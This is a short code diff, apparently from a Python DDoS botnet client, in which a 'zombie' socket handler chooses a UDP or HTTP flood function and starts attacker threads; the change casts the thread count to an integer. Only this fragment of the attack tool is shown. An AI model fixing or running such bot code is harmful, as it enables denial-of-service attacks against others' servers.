@@ -16,7 +16,7 @@ class zombie(SocketServer.BaseRequestHandler):
             fun = attackUDPFlood
         elif attack == "http":
             fun = attackHTTPFlood
-        for i in xrange(threads):
+        for i in xrange(int(threads)):
             attacker = fun(kwargs)
             attacker.start()
 
